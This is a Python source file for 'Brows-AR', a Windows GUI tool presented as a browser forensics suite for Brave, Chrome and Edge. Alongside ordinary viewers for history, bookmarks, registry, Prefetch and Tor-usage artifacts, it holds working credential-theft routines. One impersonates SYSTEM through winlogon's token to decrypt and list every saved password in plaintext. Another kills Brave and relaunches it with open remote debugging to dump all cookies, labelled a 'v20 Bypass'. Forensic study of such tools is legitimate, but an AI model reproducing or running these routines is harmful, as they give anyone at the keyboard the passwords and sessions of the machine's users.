import os
import sys
import ctypes
import sqlite3
import shutil
import json
import base64
import winreg
import datetime
import struct
import time
import subprocess
import requests
import websocket
import csv
import customtkinter as ctk
from tkinter import messagebox, ttk, filedialog
from Cryptodome.Cipher import AES
import win32crypt
import win32security
import win32api
import win32con
import psutil
import win32file

# --- 1. SYSTEM PRIVILEGE LOGIC ----
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
def rot13(text):
    """Decodes Windows UserAssist scrambled names for Tor detection."""
    res = ""
    for char in text:
        if 'a' <= char <= 'z': res += chr((ord(char) - ord('a') + 13) % 26 + ord('a'))
        elif 'A' <= char <= 'Z': res += chr((ord(char) - ord('A') + 13) % 26 + ord('A'))
        else: res += char
    return res

def impersonate_system():
    try:
        h_token = win32security.OpenProcessToken(win32api.GetCurrentProcess(), 
                                               win32security.TOKEN_ADJUST_PRIVILEGES | win32security.TOKEN_QUERY)
        priv_id = win32security.LookupPrivilegeValue(None, win32security.SE_DEBUG_NAME)
        win32security.AdjustTokenPrivileges(h_token, 0, [(priv_id, win32security.SE_PRIVILEGE_ENABLED)])
        
        target_pid = next(p.info['pid'] for p in psutil.process_iter(['name', 'pid']) if p.info['name'].lower() == 'winlogon.exe')
        h_proc = win32api.OpenProcess(win32con.PROCESS_QUERY_INFORMATION, False, target_pid)
        h_tok = win32security.OpenProcessToken(h_proc, win32security.TOKEN_DUPLICATE | win32security.TOKEN_QUERY)
        
        new_tok = win32security.DuplicateTokenEx(h_tok, win32security.SecurityImpersonation, 
                                               win32security.TOKEN_ALL_ACCESS, win32security.TokenPrimary)
        win32security.ImpersonateLoggedOnUser(new_tok)
        return True
    except:
        return False

def get_prefetch_history(pf_path):
    """Parses Windows 10/11 SCCA Prefetch files for the last 8 execution times."""
    timestamps = []
    try:
        with open(pf_path, "rb") as f:
            data = f.read()
            # Windows 10/11 typically starts timestamp array at 0x80 or 0x98
            # We look for the 'SCCA' header to verify
            if data[0:4] == b'SCCA' or data[4:8] == b'SCCA':
                # Read the last 8 timestamps (8 bytes each, FILETIME format)
                for i in range(8):
                    offset = 0x80 + (i * 8)
                    raw_time = struct.unpack("<Q", data[offset:offset+8])[0]
                    if raw_time > 0:
                        dt = (datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=raw_time/10))
                        timestamps.append(dt.strftime('%Y-%m-%d %H:%M:%S'))
    except: pass
    return sorted(timestamps, reverse=True)

# --- 2. PHYSICAL DISK MAPPER ---
FSCTL_GET_RETRIEVAL_POINTERS = 0x00090073

class DiskMapper:
    @staticmethod
    def get_physical_offset(file_path, logical_offset):
        try:
            drive = os.path.splitdrive(file_path)[0] + "\\"
            sectors_per_cluster, bytes_per_sector, _, _ = win32api.GetDiskFreeSpace(drive)
            cluster_size = sectors_per_cluster * bytes_per_sector
            
            h_file = win32file.CreateFile(
                file_path, win32con.GENERIC_READ,
                win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE,
                None, win32con.OPEN_EXISTING, win32con.FILE_FLAG_BACKUP_SEMANTICS, None
            )
            
            in_buf = struct.pack("<Q", 0) 
            out_buf = win32file.DeviceIoControl(h_file, FSCTL_GET_RETRIEVAL_POINTERS, in_buf, 1024)
            h_file.Close()
            
            extent_count = struct.unpack("<I", out_buf[:4])[0]
            starting_vcn = struct.unpack("<Q", out_buf[8:16])[0]
            target_cluster = logical_offset // cluster_size
            current_vcn = starting_vcn
            ptr = 16
            
            for i in range(extent_count):
                next_vcn = struct.unpack("<Q", out_buf[ptr:ptr+8])[0]
                lcn = struct.unpack("<q", out_buf[ptr+8:ptr+16])[0]
                if current_vcn <= target_cluster < next_vcn:
                    cluster_offset = target_cluster - current_vcn
                    physical_byte = (lcn + cluster_offset) * cluster_size
                    return physical_byte + (logical_offset % cluster_size)
                current_vcn = next_vcn
                ptr += 16
            return 0
        except:
            return 0

# --- 3. FORENSIC HEX ENGINE ---
class HexEngine:
    @staticmethod
    def get_hex_dump(file_path, offset=0, page_size=4096, physical_mode=False):
        if not file_path or not os.path.exists(file_path):
            return "[-] Artifact File Not Found."
            
        phys_base = DiskMapper.get_physical_offset(file_path, offset) if physical_mode else 0
        try:
            with open(file_path, 'rb') as f:
                f.seek(offset)
                data = f.read(page_size)
                header = f"[*] SOURCE: {file_path}\n[*] MODE: {'PHYSICAL' if physical_mode else 'RELATIVE'}\n"
                header += "Offset    00 01 02 03 04 05 06 07 08 09 0A 0B 0C 0D 0E 0F  |  ASCII\n"
                sep =    "--------  -----------------------------------------------  |  ----------------\n"
                output = [header, sep]
                
                for i in range(0, len(data), 16):
                    chunk = data[i:i+16]
                    display_addr = (phys_base + i) if (physical_mode and phys_base > 0) else (offset + i)
                    hex_p = ' '.join(f"{b:02x}" for b in chunk)
                    asc_p = ''.join(chr(b) if 32 <= b <= 126 else "." for b in chunk)
                    output.append(f"{display_addr:08x}  {hex_p:<48}  |  {asc_p}\n")
            return "".join(output)
        except:
            return "[-] Read Error: Access Denied."

# --- 4. ANALYSIS POPUP WINDOW ---
class AnalysisWindow(ctk.CTkToplevel):
    def __init__(self, title, columns, data):
        super().__init__()
        self.title(title)
        self.geometry("1200x700")
        self.attributes('-topmost', True)
        
        style = ttk.Style()
        style.theme_use("clam")
        style.configure("Treeview", background="#1a1a1a", foreground="white", fieldbackground="#1a1a1a", borderwidth=0)
        style.configure("Treeview.Heading", background="#333333", foreground="white", relief="flat")
        
        self.tree = ttk.Treeview(self, columns=columns, show='headings')
        for col in columns:
            self.tree.heading(col, text=col.upper())
            self.tree.column(col, width=200, anchor="w")
        
        for row in data:
            self.tree.insert("", "end", values=row)
            
        self.tree.pack(fill="both", expand=True, padx=10, pady=10)

# --- 5. MAIN DASHBOARD ---
class BrowsAR_App(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("Brows-AR | Ultimate Forensic Suite")
        self.geometry("1450x900")
        ctk.set_appearance_mode("dark")
        
        self.current_browser_path = ""
        self.current_browser_name = ""
        self.physical_mode = False 
        self.tab_offsets = {}
        self.page_size = 4096
        self.displays = {}
        self.last_results = []
        self.last_headers = []

        self.sidebar = ctk.CTkFrame(self, width=240, corner_radius=0)
        self.sidebar.pack(side="left", fill="y")
        ctk.CTkLabel(self.sidebar, text="Brows-AR", font=("Consolas", 28, "bold")).pack(padx=20, pady=40)

        self.browser_paths = {
            "Brave": os.path.join(os.environ['LOCALAPPDATA'], r"BraveSoftware\Brave-Browser\User Data"),
            "Chrome": os.path.join(os.environ['LOCALAPPDATA'], r"Google\Chrome\User Data"),
            "Edge": os.path.join(os.environ['LOCALAPPDATA'], r"Microsoft\Edge\User Data")
        }

        for name in self.browser_paths:
            if os.path.exists(self.browser_paths[name]):
                ctk.CTkButton(self.sidebar, text=f"Investigate {name}", font=("Consolas", 13),
                              command=lambda n=name, p=self.browser_paths[name]: self.load_browser_cockpit(n, p)).pack(pady=10, padx=20)

        self.main_view = ctk.CTkFrame(self, corner_radius=15, fg_color="#121212")
        self.main_view.pack(side="right", fill="both", expand=True, padx=20, pady=20)
        ctk.CTkLabel(self.main_view, text="[*] SYSTEM TRIAGE READY", font=("Consolas", 16)).place(relx=0.5, rely=0.5, anchor="center")

    def load_browser_cockpit(self, name, path):
        self.current_browser_name, self.current_browser_path = name, path
        for widget in self.main_view.winfo_children():
            widget.destroy()
        
        control_frame = ctk.CTkFrame(self.main_view, fg_color="transparent")
        control_frame.pack(fill="x", padx=20, pady=15)
        
        ctk.CTkLabel(control_frame, text=f"TARGET: {name.upper()}", font=("Consolas", 18, "bold"), text_color="#1f538d").pack(side="left")
        ctk.CTkButton(control_frame, text="📥 EXPORT", fg_color="#27ae60", command=self.export_evidence).pack(side="right", padx=10)
        ctk.CTkButton(control_frame, text="⚡ RUN ANALYSIS", fg_color="#d35400", command=self.trigger_analysis).pack(side="right", padx=10)
        
        self.toggle_btn = ctk.CTkButton(control_frame, text="MODE: RELATIVE", fg_color="#333333", command=self.toggle_address_mode)
        self.toggle_btn.pack(side="right", padx=10)

        self.tabview = ctk.CTkTabview(self.main_view, command=self.on_tab_changed)
        self.tabview.pack(fill="both", expand=True, padx=20, pady=(0, 20))
        
        tabs = ["Hex Explorer", "Passwords", "History", "Downloads", "Bookmarks", "Autofill", "Registry", "Prefetch"]
        if name == "Brave":
            tabs.append("Cookies")
            tabs.append("TOR-Private")
        
        for t in tabs: 
            self.tabview.add(t)
            self.tab_offsets[t] = 0
            if t == "Registry":
                self.setup_registry_explorer(t)
            else:
                self.setup_hex_tab(t)
        self.on_tab_changed()

    def toggle_address_mode(self):
        self.physical_mode = not self.physical_mode
        self.toggle_btn.configure(text="MODE: PHYSICAL" if self.physical_mode else "MODE: RELATIVE", 
                                 fg_color="#1f538d" if self.physical_mode else "#333333")
        self.on_tab_changed()

    def get_tor_network_artifacts(self, tor_folder):
        """Scans Tor config and state files for bridge usage and network volume."""
        info = []
        # 1. Bridge Detection
        torrc = os.path.join(tor_folder, "tor-torrc")
        if os.path.exists(torrc):
            with open(torrc, "r") as f:
                content = f.read()
                if "UseBridges 1" in content:
                    info.append(("Bridge Status", "ENABLED (Stealth Mode Active)"))
                    if "snowflake" in content.lower(): info.append(("Bridge Type", "Snowflake (Bypass govt firewalls)"))
                else:
                    info.append(("Bridge Status", "Disabled (Direct Connection)"))

        # 2. Network Volume (Quantification)
        # Tor often keeps a 'state' file in its DataDirectory
        data_dir = os.path.join(os.environ['LOCALAPPDATA'], r"BraveSoftware\Brave-Browser\User Data\tor\data")
        state_file = os.path.join(data_dir, "state")
        if os.path.exists(state_file):
            with open(state_file, "r") as f:
                for line in f:
                    if "TotalWriteBytes" in line:
                        bytes_val = int(line.split()[1])
                        info.append(("Total Uploaded", f"{bytes_val / (1024*1024):.2f} MB"))
                    if "TotalReadBytes" in line:
                        bytes_val = int(line.split()[1])
                        info.append(("Total Downloaded", f"{bytes_val / (1024*1024):.2f} MB"))
        return info
    def setup_hex_tab(self, t):
        container = ctk.CTkFrame(self.tabview.tab(t), fg_color="transparent")
        container.pack(fill="both", expand=True)
        
        txt = ctk.CTkTextbox(container, font=("Consolas", 14), wrap="none", fg_color="#000000", text_color="#ffffff")
        txt.pack(fill="both", expand=True, padx=10, pady=(10, 5))
        self.displays[t] = txt
        
        nav = ctk.CTkFrame(container, fg_color="transparent", height=40)
        nav.pack(fill="x", side="bottom", padx=10, pady=5)
        
        ctk.CTkButton(nav, text=" < Prev Page ", width=100, command=lambda tab=t: self.change_page(tab, -1)).pack(side="left")
        ctk.CTkButton(nav, text=" Next Page > ", width=100, command=lambda tab=t: self.change_page(tab, 1)).pack(side="right")

    def setup_registry_explorer(self, t):
        container = ctk.CTkFrame(self.tabview.tab(t), fg_color="#1a1a1a")
        container.pack(fill="both", expand=True, padx=10, pady=10)
        
        self.reg_tree = ttk.Treeview(container, show="tree")
        self.reg_tree.pack(side="left", fill="both", expand=True)
        self.reg_tree.bind("<<TreeviewSelect>>", self.on_registry_key_selected)
        
        self.reg_values = ttk.Treeview(container, columns=("Name", "Data"), show="headings")
        self.reg_values.heading("Name", text="PROPERTY")
        self.reg_values.heading("Data", text="VALUE")
        self.reg_values.column("Name", width=200)
        self.reg_values.column("Data", width=400)
        self.reg_values.pack(side="right", fill="both", expand=True)
        self.refresh_registry_tree()

    def get_reg_targets(self):
        if self.current_browser_name == "Brave":
            return [(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\BraveSoftware"), 
                    (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\BraveSoftware"), 
                    (winreg.HKEY_CURRENT_USER, r"Software\BraveSoftware"), 
                    (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Brave-Browser"), 
                    (winreg.HKEY_CLASSES_ROOT, r"BraveHTML")]
        elif self.current_browser_name == "Chrome":
            return [(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Google\Chrome"), 
                    (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Google\Update\ClientState\{8A69D345-D564-463c-AFF1-A69D9E530F96}"), 
                    (winreg.HKEY_CURRENT_USER, r"Software\Google\Chrome")]
        else:
            return [(winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\Microsoft\Edge"), 
                    (winreg.HKEY_LOCAL_MACHINE, r"SOFTWARE\WOW6432Node\Microsoft\EdgeUpdate\ClientState\{56EB18F8-8008-4CBD-B6D2-8C97FE7E9062}"), 
                    (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Edge")]

    def refresh_registry_tree(self):
        for i in self.reg_tree.get_children():
            self.reg_tree.delete(i)
        for root, path in self.get_reg_targets():
            r_name = "HKLM" if root == winreg.HKEY_LOCAL_MACHINE else ("HKCU" if root == winreg.HKEY_CURRENT_USER else "HKCR")
            node = self.reg_tree.insert("", "end", text=f"{r_name}: {path}", values=(root, path))
            self.add_reg_subkeys(node, root, path)

    def add_reg_subkeys(self, parent_node, root, path):
        try:
            with winreg.OpenKey(root, path, 0, winreg.KEY_READ | winreg.KEY_WOW64_64KEY) as key:
                for i in range(winreg.QueryInfoKey(key)[0]):
                    name = winreg.EnumKey(key, i)
                    self.reg_tree.insert(parent_node, "end", text=name, values=(root, rf"{path}\{name}"))
        except:
            pass

    def on_registry_key_selected(self, event):
        if not self.reg_tree.selection(): return
        selected = self.reg_tree.selection()[0]
        root, path = self.reg_tree.item(selected, "values")
        for i in self.reg_values.get_children():
            self.reg_values.delete(i)
        try:
            with winreg.OpenKey(int(root), path, 0, winreg.KEY_READ | winreg.KEY_WOW64_64KEY) as key:
                for i in range(winreg.QueryInfoKey(key)[1]):
                    n, d, _ = winreg.EnumValue(key, i)
                    self.reg_values.insert("", "end", values=(n, str(d)))
        except:
            pass

    def on_tab_changed(self):
        active = self.tabview.get()
        if active == "Registry" or active not in self.displays:
            return
        txt = self.displays[active]
        txt.delete("0.0", "end")
        path = self.get_artifact_path(active)
        if path:
            txt.insert("end", HexEngine.get_hex_dump(path, offset=self.tab_offsets.get(active, 0), physical_mode=self.physical_mode))

    def change_page(self, tab, direction):
        self.tab_offsets[tab] = max(0, self.tab_offsets.get(tab, 0) + (direction * self.page_size))
        self.on_tab_changed()

    def get_artifact_path(self, active):
        # --- 1. TOR-SPECIFIC CHECK (MUST BE FIRST) ---
        # This prevents the "Local State" default from highjacking the path
        if active == "TOR-Private" and self.current_browser_name == "Brave":
            tor_comp_root = os.path.join(self.current_browser_path, "cpoalefficncklhjfpglfiplenlpccdb")
            if os.path.exists(tor_comp_root):
                # os.walk handles the version folder (e.g., 1.0.42) automatically
                for root, dirs, files in os.walk(tor_comp_root):
                    if "tor-torrc" in files:
                        return os.path.join(root, "tor-torrc")
                    elif "tor.exe" in files:
                        return os.path.join(root, "tor.exe")
            return None # Return None if Tor isn't installed

        # --- 2. DEFINE OTHER TARGET NAMES ---
        t_name = {"Passwords": "Login Data", "History": "History", "Downloads": "History", 
                  "Bookmarks": "Bookmarks", "Autofill": "Web Data", "Cookies": "Cookies"}.get(active, "Local State")
        
        # --- 3. PRIORITY ROOT CHECK (Maintains WinHex accuracy for Chrome/Edge) ---
        root_path = os.path.join(self.current_browser_path, t_name)
        if os.path.exists(root_path) and not os.path.isdir(root_path): 
            return root_path

        # --- 4. STANDARD RECURSIVE FALLBACK ---
        for r, d, f in os.walk(self.current_browser_path):
            if t_name in f: return os.path.join(r, t_name)
        return None

    def trigger_analysis(self):
        tab = self.tabview.get()
        if tab == "Passwords": self.analyze_passwords()
        elif tab == "History": self.analyze_history()
        elif tab == "Downloads": self.analyze_downloads()
        elif tab == "Bookmarks": self.analyze_bookmarks()
        elif tab == "Autofill": self.analyze_autofill()
        elif tab == "Registry": self.analyze_registry_deep()
        elif tab == "Prefetch": self.analyze_prefetch_deep()
        elif tab == "Cookies": self.analyze_brave_cookies()
        elif tab == "TOR-Private": self.analyze_tor_private()

    # --- 6. FORENSIC ANALYZERS (BOOKMARKS & AUTOFILL) ---
    def analyze_bookmarks(self):
        path = self.get_artifact_path("Bookmarks")
        if not path: return
        try:
            with open(path, "r", encoding="utf-8") as f:
                data = json.load(f)
                res = []
                def parse_nodes(node):
                    if node.get("type") == "url":
                        res.append((node.get("name"), node.get("url")))
                    if "children" in node:
                        for child in node["children"]:
                            parse_nodes(child)
                for key in data.get("roots", {}):
                    parse_nodes(data["roots"][key])
            self.last_results, self.last_headers = res, ["Name", "URL"]
            AnalysisWindow(f"{self.current_browser_name} Bookmarks", self.last_headers, res)
        except Exception as e:
            messagebox.showerror("Forensic Error", str(e))
    def analyze_tor_private(self):
        """Master Tor Forensic Engine: Registry, Prefetch, Config, and Network."""
        res = []

        comp = os.path.join(self.current_browser_path, "cpoalefficncklhjfpglfiplenlpccdb")
        if os.path.exists(comp):
            m_time = datetime.datetime.fromtimestamp(os.path.getmtime(comp))
            res.append(("Tor Plugin Status", f"INSTALLED/INITIALIZED: {m_time}"))
            
        # 1. Timeline Analysis (Prefetch)
        pf_dir = r"C:\Windows\Prefetch"
        if os.path.exists(pf_dir):
            for f in os.listdir(pf_dir):
                if "TOR" in f.upper() and f.endswith(".pf"):
                    times = get_prefetch_history(os.path.join(pf_dir, f))
                    for i, t in enumerate(times):
                        res.append((f"Execution Time {i+1}", t))

        # 2. Bridge & Volume Extraction
        tor_comp = os.path.join(self.current_browser_path, "cpoalefficncklhjfpglfiplenlpccdb")
        if os.path.exists(tor_comp):
            # Use os.walk to find the version folder (e.g. 1.0.42)
            for root, dirs, files in os.walk(tor_comp):
                if "tor-torrc" in files:
                    net_data = self.get_tor_network_artifacts(root)
                    res.extend(net_data)

        # 3. Registry History (Keep original logic)
        try:
            ua_path = r"Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\Count"
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, ua_path) as key:
                for i in range(winreg.QueryInfoKey(key)[1]):
                    n, d, _ = winreg.EnumValue(key, i)
                    decoded = rot13(n)
                    if "tor" in decoded.lower():
                        res.append(("Registry Record", f"{decoded} (Runs: {struct.unpack('<I', d[4:8])[0]})"))
        except: pass

        self.last_results, self.last_headers = res, ["Forensic Artifact", "Extracted Evidence"]
        AnalysisWindow("Brave TOR - Full Forensic Profile", self.last_headers, res)

    def analyze_autofill(self):
        path = self.get_artifact_path("Autofill")
        if not path: return
        temp = "temp_auto.db"
        shutil.copyfile(path, temp)
        try:
            conn = sqlite3.connect(temp)
            cur = conn.cursor()
            cur.execute("SELECT name, value FROM autofill")
            res = cur.fetchall()
            conn.close()
            os.remove(temp)
            self.last_results, self.last_headers = res, ["Field Name", "Stored Value"]
            AnalysisWindow(f"{self.current_browser_name} Autofill Evidence", self.last_headers, res)
        except Exception as e:
            messagebox.showerror("Forensic Error", str(e))

    def analyze_downloads(self):
        path = self.get_artifact_path("Downloads")
        if not path: return
        temp = "temp_dw.db"
        shutil.copyfile(path, temp)
        try:
            conn = sqlite3.connect(temp)
            cur = conn.cursor()
            cur.execute("SELECT target_path, start_time, received_bytes, state, tab_url FROM downloads")
            res = []
            for row in cur.fetchall():
                ts = (datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=row[1])).strftime('%Y-%m-%d %H:%M') if row[1] > 0 else "N/A"
                status = "Complete" if row[3] == 1 else "Incomplete/Failed"
                res.append((row[0], ts, f"{row[2]/1024:.1f} KB", status, row[4]))
            conn.close()
            os.remove(temp)
            self.last_results, self.last_headers = res, ["Local Path", "Time", "Size", "Status", "Source URL"]
            AnalysisWindow(f"{self.current_browser_name} Downloads", self.last_headers, res)
        except:
            pass

    def analyze_registry_deep(self):
        targets, res = self.get_reg_targets(), []
        def crawl(root, path):
            try:
                with winreg.OpenKey(root, path, 0, winreg.KEY_READ | winreg.KEY_WOW64_64KEY) as key:
                    n_s, n_v, l_m = winreg.QueryInfoKey(key)
                    t_m = (datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=l_m // 10)).strftime('%Y-%m-%d %H:%M:%S')
                    res.append((f"[KEY] {path}", f"Last Modified: {t_m}"))
                    for i in range(n_v):
                        n, v, _ = winreg.EnumValue(key, i)
                        res.append((f"  -> {n}", str(v)))
                    for i in range(n_s):
                        crawl(root, rf"{path}\{winreg.EnumKey(key, i)}")
            except:
                pass
        for r, p in targets:
            crawl(r, p)
        self.last_results, self.last_headers = res, ["Artifact Path", "Value / Metadata"]
        AnalysisWindow("Registry Scan", self.last_headers, res)

    def analyze_passwords(self):
        try:
            win32security.RevertToSelf()
        except:
            pass
        ls_path = self.get_artifact_path("Hex Explorer")
        with open(ls_path, "r", encoding="utf-8") as f:
            ls = json.load(f)
            
        if "app_bound_encrypted_key" in ls["os_crypt"]:
            raw_key = base64.b64decode(ls["os_crypt"]["app_bound_encrypted_key"])[4:]
            if impersonate_system():
                try:
                    s1 = win32crypt.CryptUnprotectData(raw_key, None, None, None, 0)[1]
                finally:
                    win32security.RevertToSelf()
            final_key = win32crypt.CryptUnprotectData(s1, None, None, None, 0)[1][-32:]
        else:
            final_key = win32crypt.CryptUnprotectData(base64.b64decode(ls["os_crypt"]["encrypted_key"])[5:], None, None, None, 0)[1]
            
        db_path = self.get_artifact_path("Passwords")
        temp_db = "temp_pass.db"
        shutil.copyfile(db_path, temp_db)
        res = []
        conn = sqlite3.connect(temp_db)
        cur = conn.cursor()
        cur.execute("SELECT origin_url, username_value, password_value FROM logins")
        
        for url, u_v, enc_p in cur.fetchall():
            try:
                iv, pay = enc_p[3:15], enc_p[15:]
                cip = AES.new(final_key, AES.MODE_GCM, iv)
                if self.current_browser_name in ["Chrome", "Edge", "Brave"]:
                    cip.update(b'browser')
                res.append((url, u_v, cip.decrypt(pay[:-16]).decode('utf-8', errors='ignore')))
            except:
                res.append((url, u_v, "[Encrypted]"))
        conn.close()
        os.remove(temp_db)
        self.last_results, self.last_headers = res, ["URL", "User", "Password"]
        AnalysisWindow("Credentials", self.last_headers, res)

    def analyze_history(self):
        path = self.get_artifact_path("History")
        temp = "temp_hist.db"
        shutil.copyfile(path, temp)
        conn = sqlite3.connect(temp)
        cur = conn.cursor()
        cur.execute("SELECT url, title, visit_count FROM urls")
        data = cur.fetchall()
        conn.close()
        os.remove(temp)
        self.last_results, self.last_headers = data, ["URL", "Title", "Visits"]
        AnalysisWindow("History", self.last_headers, data)

    def analyze_prefetch_deep(self):
        exe_map = {"Brave": "BRAVE.EXE", "Chrome": "CHROME.EXE", "Edge": "MSEDGE.EXE"}
        exe, pf_dir, res = exe_map.get(self.current_browser_name, ""), r"C:\Windows\Prefetch", []
        if not os.path.exists(pf_dir): return
        
        for f in os.listdir(pf_dir):
            if f.upper().startswith(exe) and f.endswith(".pf"):
                path = os.path.join(pf_dir, f)
                stat = os.stat(path)
                with open(path, "rb") as fd:
                    h = fd.read(8)
                    info = f"MAM Compressed | {datetime.datetime.fromtimestamp(stat.st_mtime)}" if h[0:3] == b'MAM' else f"SCCA Standard"
                res.append((f, info))
        self.last_results, self.last_headers = res, ["Artifact", "Data"]
        AnalysisWindow("Prefetch", self.last_headers, res)

    def analyze_brave_cookies(self):
        messagebox.showinfo("Brows-AR", "Starting Headless Bypass. Brave will close temporarily.")
        brave_exe = r"C:\Program Files\BraveSoftware\Brave-Browser\Application\brave.exe"
        subprocess.run("taskkill /F /IM brave.exe /T", shell=True, capture_output=True)
        time.sleep(2)
        cmd = f'"{brave_exe}" --remote-debugging-port=9222 --user-data-dir="{self.current_browser_path}" --remote-allow-origins=* --headless --disable-gpu'
        subprocess.Popen(cmd, shell=True)
        time.sleep(5)
        try:
            resp = requests.get("http://localhost:9222/json")
            ws_url = resp.json()[0]['webSocketDebuggerUrl']
            ws = websocket.create_connection(ws_url)
            ws.send(json.dumps({"id": 1, "method": "Network.getAllCookies"}))
            result = json.loads(ws.recv())
            cookies = result.get('result', {}).get('cookies', [])
            ws.close()
            subprocess.run("taskkill /F /IM brave.exe /T", shell=True, capture_output=True)
            res = [(c['domain'], c['name'], c['value'][:50]+"...") for c in cookies]
            self.last_results, self.last_headers = res, ["Domain", "Name", "Value"]
            AnalysisWindow("Brave Cookies (v20 Bypass)", self.last_headers, res)
        except Exception as e: messagebox.showerror("Bypass Failed", f"Error: {e}")

    def export_evidence(self):
        if not self.last_results: return
        f = filedialog.asksaveasfilename(defaultextension=".html", filetypes=[("HTML Report", "*.html"), ("CSV", "*.csv")])
        if f: 
            html = f"<html><body style='font-family:monospace; background:#121212; color:white;'><h1>Report: {self.current_browser_name}</h1><table border='1'>"
            html += "<tr>" + "".join([f"<th>{h}</th>" for h in self.last_headers]) + "</tr>"
            for row in self.last_results:
                html += "<tr>" + "".join([f"<td>{v}</td>" for v in row]) + "</tr>"
            html += "</table></body></html>"
            with open(f, "w", encoding="utf-8") as f_out:
                f_out.write(html)
            messagebox.showinfo("Brows-AR", "Export Complete")

if __name__ == "__main__":
    if not is_admin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    else:
        app = BrowsAR_App()
        app.mainloop()